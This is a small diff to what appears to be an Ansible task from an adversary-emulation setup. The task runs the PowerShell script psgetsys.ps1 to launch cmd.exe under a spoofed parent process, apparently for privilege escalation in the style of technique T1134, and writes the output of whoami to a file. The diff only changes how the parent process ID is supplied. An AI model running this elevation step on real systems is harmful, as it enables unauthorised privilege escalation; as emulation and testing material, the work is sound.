@@ -15,4 +15,4 @@
       
     - name: Execute elevation powershell script
       win_shell: |
-        c:\temp\psgetsys.ps1; [MyProcess]::CreateProcessFromParent((Get-Process pid).Id,"cmd.exe \k whoami > c:\temp\t1134.txt")
+        c:\temp\psgetsys.ps1; [MyProcess]::CreateProcessFromParent({{ pid }},"cmd.exe \k whoami > c:\temp\t1134.txt")
